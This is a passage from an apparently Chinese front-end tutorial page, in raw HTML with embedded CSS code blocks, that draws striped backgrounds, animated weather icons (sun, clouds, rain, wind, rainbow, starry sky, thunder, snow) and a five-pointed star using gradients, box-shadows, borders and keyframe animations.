data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c3045511cb71?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"322\" data-height=\"270\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;322&quot; height=&quot;270&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>/*arrow-stripe*/\n.arrow-stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:.5em;\n    background:\n            linear-gradient(45deg, #92baac 45px, transparent 45px)64px 64px,\n            linear-gradient(45deg, #92baac 45px, transparent 45px,transparent 91px, #e1ebbd 91px, #e1ebbd 135px, transparent 135px),\n            linear-gradient(-45deg, #92baac 23px, transparent 23px, transparent 68px,#92baac 68px,#92baac 113px,transparent 113px,transparent 158px,#92baac 158px);\n    background-color:#e1ebbd;\n    background-size: 128px 128px;\n}\n</code></pre>\n<ul>\n<li>混合模式背景图</li>\n</ul>\n<p></p><figure><img alt=\"混合模式背景图\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c32894bab7b7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"409\" data-height=\"266\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;409&quot; height=&quot;266&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>.colorful-stripe {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    width: 300px;\n    height: 200px;\n    text-align: center;\n    color: #fff;\n    font-size: 200%;\n    border-radius: .5em;\n    background:\n            linear-gradient(limegreen, transparent), linear-gradient(90deg, skyblue, transparent), linear-gradient(-90deg, coral, transparent);\n    background-blend-mode: screen;\n}\n</code></pre>\n<ul>\n<li>太阳</li>\n</ul>\n<p></p><figure><img alt=\"sun\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb0a29b83907?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用线性渐变、阴影、旋转实现，具体代码如下：</p>\n<pre><code>/*sun*/\n.sun{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#0BF;\n    border-radius:5px;\n}\n.sun:before{\n    content:\"\";\n    position: absolute;\n    width: 80px;\n    height: 80px;\n    left: 50%;\n    top: 50%;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:rgba(255, 238, 68, 1);\n    box-shadow: 0 0 0 15px rgba(255,255,0,0.2),0 0 15px #fff;\n    z-index:-10;\n}\n.sun:after{\n    content:\"\";\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    height: 160px;\n    width: 160px;\n    transform: translate(-50%, -50%) rotate(30deg);\n    z-index:-100;\n    background-image:\n            -webkit-linear-gradient(top,rgba(255,255,255,0) 0%, rgba(255,255,255,0.8) 50%, rgba(255,255,255,0) 100%),\n            -webkit-linear-gradient(left,rgba(255,255,255,0) 0%, rgba(255,255,255,0.8) 50%, rgba(255,255,255,0) 100%);\n    background-size: 20px 100%, 100% 20px;\n    background-repeat: no-repeat;\n    background-position: center center, center center;\n    animation:sunRotate 10s linear infinite;\n}\n@keyframes sunRotate{\n    0%{\n        transform: translate(-50%, -50%) rotate(30deg);\n    }\n    100%{\n        transform: translate(-50%, -50%) rotate(390deg);\n    }\n}\n</code></pre>\n<ul>\n<li>多云</li>\n</ul>\n<p></p><figure><img alt=\"cloud\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb292be61801?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用线性渐变、阴影、缩放实现，具体实现如下：</p>\n<pre><code>/*cloudy*/\n.cloudy{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#2EB5E5;\n    border-radius:5px;\n}\n.cloudy:before {\n    content: \"\";\n    text-indent:23px;\n    font-size:22px;\n    line-height:40px;\n    color:#333;\n    position: absolute;\n    height: 50px;width: 50px;\n    background: #FFFFFF;\n    left:30%;\n    top:45%;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #FFFFFF 65px -15px 0 -5px,\n            #FFFFFF 25px -25px,\n            #FFFFFF 30px 10px,\n            #FFFFFF 60px 15px 0 -10px,\n            #FFFFFF 85px 5px 0 -5px,\n            #C8C8C8 35px -35px,\n            #C8C8C8 66px -27px 0 -5px,\n            #C8C8C8 91px -10px 0 -8px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.cloudy:after{\n    content:\"\";\n    position: absolute;\n    top: 80%;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background:rgba(0,0,0,.5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50%{\n        transform: translate(-50%, -70%);\n    }\n    100%{\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50%{\n        transform: translate(-50%, -50%) scale(0.8);\n        background:rgba(0,0,0,.2);\n    }\n    100%{\n        transform: translate(-50%, -50%) scale(1);\n        background:rgba(0,0,0,.5);\n    }\n}\n</code></pre>\n<p></p><figure><img alt=\"cloud2\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb387b64eb76?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>/*cloudy2*/\n.cloudy2{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#2EB5E5;\n    border-radius:5px;\n}\n.cloudy2:before {\n    content: \"\";\n    text-indent:23px;\n    font-size:22px;\n    line-height:40px;\n    color:#333;\n    position: absolute;\n    height: 50px;width: 50px;\n    background: #FFFFFF;\n    left:30%;\n    top:55%;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    z-index:100;\n    box-shadow:\n            #FFFFFF 65px -15px 0 -5px,\n            #FFFFFF 25px -25px,\n            #FFFFFF 30px 10px,\n            #FFFFFF 60px 15px 0 -10px,\n            #FFFFFF 85px 5px 0 -5px;\n    animation: cloudy2 5s ease-in-out infinite;\n}\n.cloudy2:after{\n    content:\"\";\n    position: absolute;\n    top: 45%;left: 63%;\n    height: 60px;\n    width: 60px;\n    z-index:10;\n    background:linear-gradient(180deg,#FE9F38 0%, #F46635 100%);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    box-shadow: 0 0 10px 4px #FFA563;\n    animation: cloudy2 10s ease-in-out infinite;\n}\n@keyframes cloudy2 {\n    50%{\n        transform: translate(-50%, -70%);\n    }\n    100%{\n        transform: translate(-50%, -50%);\n    }\n}\n</code></pre>\n<ul>\n<li>雨</li>\n</ul>\n<p></p><figure><img alt=\"rain\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb4becbf5596?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用线性渐变、阴影、缩放实现，具体代码如下：</p>\n<pre><code>/*rainy*/\n.rainy {\n    position: absolute;\n    width: 3px;\n    height: 6px;\n    top: 30%;\n    left: 50%;\n    background: #CCCCCC;\n    border-radius: 50%;\n    animation: rainy_rain .7s infinite linear;\n}\n.rainy:before {\n    content: \"\";\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 30px;\n    left: -40px;\n    background: #CCC;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow: #CCC 65px -15px 0 -5px, #CCC 25px -25px, #CCC 30px 10px, #CCC 60px 15px 0 -10px, #CCC 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.rainy:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -70%);\n    }\n    100% {\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n@keyframes rainy_rain {\n    0% {\n        box-shadow: rgba(0, 0, 0, 0) -10px 30px, rgba(0, 0, 0, 0) 40px 40px, rgba(0, 0, 0, .3) -50px 75px, rgba(0, 0, 0, .3) 55px 50px, rgba(0, 0, 0, .3) -18px 100px, rgba(0, 0, 0, .3) 12px 95px, rgba(0, 0, 0, .3) -31px 45px, rgba(0, 0, 0, .3) 30px 35px;\n    }\n    25% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 45px, rgba(0, 0, 0, .3) 40px 60px, rgba(0, 0, 0, .3) -50px 90px, rgba(0, 0, 0, .3) 55px 65px, rgba(0, 0, 0, 0) -18px 120px, rgba(0, 0, 0, 0) 12px 120px, rgba(0, 0, 0, .3) -31px 70px, rgba(0, 0, 0, .3) 30px 60px;\n    }\n    26% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 45px, rgba(0, 0, 0, .3) 40px 60px, rgba(0, 0, 0, .3) -50px 90px, rgba(0, 0, 0, .3) 55px 65px, rgba(0, 0, 0, 0) -18px 40px, rgba(0, 0, 0, 0) 12px 20px, rgba(0, 0, 0, .3) -31px 70px, rgba(0, 0, 0, .3) 30px 60px;\n    }\n    50% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 70px, rgba(0, 0, 0, .3) 40px 80px, rgba(0, 0, 0, 0) -50px 100px, rgba(0, 0, 0, .3) 55px 80px, rgba(0, 0, 0, .3) -18px 60px, rgba(0, 0, 0, .3) 12px 45px, rgba(0, 0, 0, .3) -31px 95px, rgba(0, 0, 0, .3) 30px 85px;\n    }\n    51% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 70px, rgba(0, 0, 0, .3) 40px 80px, rgba(0, 0, 0, 0) -50px 45px, rgba(0, 0, 0, .3) 55px 80px, rgba(0, 0, 0, .3) -18px 60px, rgba(0, 0, 0, .3) 12px 45px, rgba(0, 0, 0, .3) -31px 95px, rgba(0, 0, 0, .3) 30px 85px;\n    }\n    75% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 95px, rgba(0, 0, 0, .3) 40px 100px, rgba(0, 0, 0, .3) -50px 60px, rgba(0, 0, 0, 0) 55px 95px, rgba(0, 0, 0, .3) -18px 80px, rgba(0, 0, 0, .3) 12px 70px, rgba(0, 0, 0, 0) -31px 120px, rgba(0, 0, 0, 0) 30px 110px;\n    }\n    76% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 95px, rgba(0, 0, 0, .3) 40px 100px, rgba(0, 0, 0, .3) -50px 60px, rgba(0, 0, 0, 0) 55px 35px, rgba(0, 0, 0, .3) -18px 80px, rgba(0, 0, 0, .3) 12px 70px, rgba(0, 0, 0, 0) -31px 25px, rgba(0, 0, 0, 0) 30px 15px;\n    }\n    100% {\n        box-shadow: rgba(0, 0, 0, 0) -10px 120px, rgba(0, 0, 0, 0) 40px 120px, rgba(0, 0, 0, .3) -50px 75px, rgba(0, 0, 0, .3) 55px 50px, rgba(0, 0, 0, .3) -18px 100px, rgba(0, 0, 0, .3) 12px 95px, rgba(0, 0, 0, .3) -31px 45px, rgba(0, 0, 0, .3) 30px 35px;\n    }\n}\n</code></pre>\n<ul>\n<li>微风</li>\n</ul>\n<p></p><figure><img alt=\"wind\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb5cd8e6d262?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用border、transparent、实现，这个会多一层 <code>div.breeze-container</code> 包裹，样式代码如下：</p>\n<pre><code>/*breeze*/\n.breeze-container{\n    position: absolute;\n    top: 50%;left: 50%;\n    width:200px;height:260px;\n    transform: translate(-50%, -50%);\n    text-align:center;\n    font-size:200%;\n    color:#fff;\n    background:#00BBFF;\n    border-radius:5px;\n}\n.breeze-container:after{\n    content:\"\";\n    position:absolute;\n    top:58%;\n    left:50%;\n    transform: translate(-50%, -50%);\n    width:6px;\n    height:70px;\n    background:#fff;\n}\n.breeze{\n    position:absolute;\n    top: 30%;\n    left: 50%;\n    transform: translate(-50%, -50%) rotate(1deg);\n    border-bottom:60px solid #fff;\n    border-left:5px solid transparent;\n    border-right:5px solid transparent;\n    animation: windmill 12s infinite linear;\n    transform-origin:50.5% 62px;\n}\n.breeze:before{\n    position:absolute;\n    top: 75px;left: -59px;\n    content:\"\";\n    border-right:60px solid #fff;\n    border-top:5px solid transparent;\n    border-bottom:5px solid transparent;\n    transform:rotate(-30deg);\n}\n.breeze:after{\n    position:absolute;\n    top: 75px;left: -1px;\n    content:\"\";\n    border-left:60px solid #fff;\n    border-top:5px solid transparent;\n    border-bottom:5px solid transparent;\n    transform:rotate(30deg);\n}\n@keyframes windmill{\n    0%{\n        transform: translate(-50%, -50%) rotate(0deg);\n    }\n    100%{\n        transform: translate(-50%, -50%) rotate(360deg);\n    }\n}\n</code></pre>\n<ul>\n<li>彩虹</li>\n</ul>\n<p></p><figure><img alt=\"rainbow\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb6a409c0973?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>主要是利用border、box-shadow 实现，具体实现如下：</p>\n<pre><code>/*rainbow*/\n.rainbow-container{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#F3D166;\n    border-radius:5px;\n}\n.rainbow{\n    position:absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    height: 1px;width: 1px;\n}\n.rainbow:before{\n    content:\"\";\n    position:absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%) rotate(45deg);\n    height: 70px;width: 70px;\n    border-radius: 100px 0 0 0;\n    box-shadow:\n            #F44336 -2px -2px 0 1px,\n            #FF9800 -4px -4px 0 3px,\n            #FFEB3B -6px -6px 0 5px,\n            #8BC34A -8px -8px 0 7px,\n            #00BCD4 -10px -10px 0 9px,\n            #2196F3 -12px -12px 0 11px,\n            #9C27B0 -14px -14px 0 13px;\n    animation: rainbow 5s ease-in-out infinite;\n}\n.rainbow:after{\n    content: \"\";\n    position: absolute;\n    top: 70px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes rainbow {\n    50% {\n        transform: translate(-50%, -55%) rotate(30deg);\n    }\n    100% {\n        transform: translate(-50%, -50%) rotate(45deg);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n</code></pre>\n<ul>\n<li>夜空</li>\n</ul>\n<p></p><figure><img alt=\"moon\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb7c1751450a?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>主要是利用 box-shadow 实现 ， 实现方式如下：</p>\n<pre><code>/*starry*/\n.starry-container{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#222233;\n    border-radius:5px;\n}\n.starry{\n    position:absolute;\n    top: 30%;left: 40%;\n    transform: translate(-50%, -50%);\n    height: 4px;width: 4px;\n    border-radius:50%;\n    box-shadow:\n            #FFFFFF -26px 77px 0 -1px,\n            rgba(255,255,255,0.1) -36px 59px 0 -1px,\n            rgba(255,255,255,0.1) -28px 89px 0 -1px,\n            #FFFFFF -35px 20px 0 -1px,\n            #FFFFFF 14px 100px,\n            rgba(255,255,255,0.1) 41px 60px,\n            #FFFFFF 34px 39px,\n            rgba(255,255,255,0.1) 14px 45px 0 -1px,\n            #FFFFFF 64px 12px 0 -1px,\n            rgba(255,255,255,0.1) 32px 96px 0 -1px,\n            #FFFFFF 64px 71px,\n            rgba(255,255,255,0.1) 60px 18px 0 -1px,\n            #FFFFFF 34px 9px,\n            rgba(255,255,255,0.1) -26px 55px 0 -1px;\n    animation: starry_star 5s ease-in-out infinite;\n}\n.starry:before{\n    content:\"\";\n    position:absolute;\n    top: 20%;left: 50%;\n    width:100px;height:100px;\n    box-shadow: #FFFFFF -25px 0;\n    transform: rotate(-5deg);\n    border-radius: 50%;\n    animation: starry 5s ease-in-out infinite;\n}\n@keyframes starry {\n    50% {\n        transform: rotate(10deg);\n    }\n}\n@keyframes starry_star{\n    50%{\n        box-shadow:\n                rgba(255,255,255,0.1) -26px 77px 0 -1px,\n                #FFF -36px 59px 0 -1px,\n                #FFF -28px 89px 0 -1px,\n                rgba(255,255,255,0.1) -35px 20px 0 -1px,\n                rgba(255,255,255,0.1) 14px 100px,\n                #FFF 41px 60px,\n                rgba(255,255,255,0.1) 34px 39px,\n                #FFF 14px 45px 0 -1px,\n                rgba(255,255,255,0.1) 64px 12px 0 -1px,\n                #FFF 32px 96px 0 -1px,\n                rgba(255,255,255,0.1) 64px 71px,\n                #FFF 60px 18px 0 -1px,\n                rgba(255,255,255,0.1) 34px 9px,\n                #FFF -26px 55px 0 -1px;\n    }\n}\n</code></pre>\n<ul>\n<li>雷电</li>\n</ul>\n<p></p><figure><img alt=\"thunder\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb8bcf96f93e?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>主要是利用阴影、border实现，代码如下：</p>\n<pre><code>/*thunder*/\n.thunder-container {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 260px;\n    transform: translate(-50%, -50%);\n    background: #444;\n    border-radius: 5px;\n}\n.thunder {\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 40%;\n    left: 30%;\n    background: #222;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #222 65px -15px 0 -5px,\n            #222 25px -25px,\n            #222 30px 10px,\n            #222 60px 15px 0 -10px,\n            #222 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.thunder:before {\n    content: \"\";\n    position: absolute;\n    top: 60px;\n    left: 60px;\n    border-left: 0px solid transparent;\n    border-right: 8px solid transparent;\n    border-top: 38px solid yellow;\n    box-shadow: yellow -7px -32px;\n    transform:rotate(30deg);\n    transform-origin:center -50px;\n    animation:stormy_thunder 2s steps(1, end) infinite;;\n}\n.thunder:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 64px;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    z-index:-1;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -30px);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, 0) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n}\n@keyframes stormy_thunder{\n    0%  {  transform: rotate(30deg); opacity:1; }\n    5%  {  transform: rotate(-34deg); opacity:1; }\n    10% {  transform: rotate(0deg); opacity:1; }\n    15% {  transform: rotate(-34deg); opacity:0; }\n}\n</code></pre>\n<ul>\n<li>大雪</li>\n</ul>\n<p></p><figure><img alt=\"snow\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb9204a92b1e?imageslim\" data-width=\"294\" data-height=\"289\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;294&quot; height=&quot;289&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用阴影实现 ， 代码如下：</p>\n<pre><code>/*snow*/\n.snowy-container {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 260px;\n    transform: translate(-50%, -50%);\n    text-align: center;\n    font-size: 200%;\n    color: #fff;\n    background: #607D8B;\n    border-radius: 5px;\n}\n.snowy {\n    position: absolute;\n    width: 4px;\n    height: 4px;\n    border-radius:50%;\n    top: 30%;\n    left: 50%;\n    background: #fff;\n    border-radius: 50%;\n    animation: snowy_rain 2s infinite linear;\n}\n.snowy:before {\n    content: \"\";\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 30px;\n    left: -40px;\n    background: #eee;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #eee 65px -15px 0 -5px,\n            #eee 25px -25px,\n            #eee 30px 10px,\n            #eee 60px 15px 0 -10px,\n            #eee 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.snowy:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -70%);\n    }\n    100% {\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n@keyframes snowy_rain {\n    0% {\n        box-shadow:\n                rgba(255, 255, 255, 0) -10px 30px,\n                rgba(255, 255, 255, 0) 40px 40px,\n                rgba(255, 255, 255, .6) -50px 75px,\n                rgba(255, 255, 255, .6) 55px 50px,\n                rgba(255, 255, 255, .6) -18px 100px,\n                rgba(255, 255, 255, .6) 12px 95px,\n                rgba(255, 255, 255, .6) -31px 45px,\n                rgba(255, 255, 255, .6) 30px 35px;\n    }\n    25% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 45px,\n                rgba(255, 255, 255, .6) 40px 60px,\n                rgba(255, 255, 255, .6) -50px 90px,\n                rgba(255, 255, 255, .6) 55px 65px,\n                rgba(255, 255, 255, 0) -18px 120px,\n                rgba(255, 255, 255, 0) 12px 120px,\n                rgba(255, 255, 255, .6) -31px 70px,\n                rgba(255, 255, 255, .6) 30px 60px;\n    }\n    26% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 45px,\n                rgba(255, 255, 255, .6) 40px 60px,\n                rgba(255, 255, 255, .6) -50px 90px,\n                rgba(255, 255, 255, .6) 55px 65px,\n                rgba(255, 255, 255, 0) -18px 40px,\n                rgba(255, 255, 255, 0) 12px 20px,\n                rgba(255, 255, 255, .6) -31px 70px,\n                rgba(255, 255, 255, .6) 30px 60px;\n    }\n    50% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 70px,\n                rgba(255, 255, 255, .6) 40px 80px,\n                rgba(255, 255, 255, 0) -50px 100px,\n                rgba(255, 255, 255, .6) 55px 80px,\n                rgba(255, 255, 255, .6) -18px 60px,\n                rgba(255, 255, 255, .6) 12px 45px,\n                rgba(255, 255, 255, .6) -31px 95px,\n                rgba(255, 255, 255, .6) 30px 85px;\n    }\n    51% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 70px,\n                rgba(255, 255, 255, .6) 40px 80px,\n                rgba(255, 255, 255, 0) -50px 45px,\n                rgba(255, 255, 255, .6) 55px 80px,\n                rgba(255, 255, 255, .6) -18px 60px,\n                rgba(255, 255, 255, .6) 12px 45px,\n                rgba(255, 255, 255, .6) -31px 95px,\n                rgba(255, 255, 255, .6) 30px 85px;\n    }\n    75% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 95px,\n                rgba(255, 255, 255, .6) 40px 100px,\n                rgba(255, 255, 255, .6) -50px 60px,\n                rgba(255, 255, 255, 0) 55px 95px,\n                rgba(255, 255, 255, .6) -18px 80px,\n                rgba(255, 255, 255, .6) 12px 70px,\n                rgba(255, 255, 255, 0) -31px 120px,\n                rgba(255, 255, 255, 0) 30px 110px;\n    }\n    76% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 95px,\n                rgba(255, 255, 255, .6) 40px 100px,\n                rgba(255, 255, 255, .6) -50px 60px,\n                rgba(255, 255, 255, 0) 55px 35px,\n                rgba(255, 255, 255, .6) -18px 80px,\n                rgba(255, 255, 255, .6) 12px 70px,\n                rgba(255, 255, 255, 0) -31px 25px,\n                rgba(255, 255, 255, 0) 30px 15px;\n    }\n    100% {\n        box-shadow:\n                rgba(255, 255, 255, 0) -10px 120px,\n                rgba(255, 255, 255, 0) 40px 120px,\n                rgba(255, 255, 255, .6) -50px 75px,\n                rgba(255, 255, 255, .6) 55px 50px,\n                rgba(255, 255, 255, .6) -18px 100px,\n                rgba(255, 255, 255, .6) 12px 95px,\n                rgba(255, 255, 255, .6) -31px 45px,\n                rgba(255, 255, 255, .6) 30px 35px;\n    }\n}\n</code></pre>\n<ul>\n<li>五角星</li>\n</ul>\n<p></p><figure><img alt=\"五角星\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c60c3b3523d7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"234\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;234&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>主要是利用border、transparent、旋转实现，代码如下：</p>\n<pre><code>/*star*/\n.five-star{\n    position: absolute;\n    top: 35%;\n    right: 50%;\n    transform: translate(-50%, -50%) scale(8);\n    width: 0;\n    height: 0;\n    display: block;\n    border-left: 3.04px solid transparent;\n    border-right: 3.24px solid transparent;\n    border-bottom: 10px solid #98DBE3;\n    -webkit-filter: drop-shadow(1px .5px 1px #ccc);\n    cursor: pointer;\n}\n.five-star:before{\n    content: \"\";\n    position: absolute;\n    top: 8.65px;\n    left: -8.82px;\n    width: 0;\n    height: 0;\n    color: #98DBE3;\n    display: block;\n    border-left: 12.5px solid transparent;\n    border-right: 12.5px solid transparent;\n    border-bottom: 9.08px solid #98DBE3;\n    transform-origin: top center;\n    transform: rotate(36deg);\n}\n.five-star:after{\n    content: \"\";\n    position: absolute;\n    top: 8.65px;\n    left: -15px;\n    width: 0;\n    height: 0;\n    color: #98DBE3;\n    display: block;\n    border-left: 12.5px solid transparent;\n    border-right: 12.5px solid transparent;\n    border-bottom: 9.08px solid #98DBE3;\n    transform-origin: top center;\n    transform: 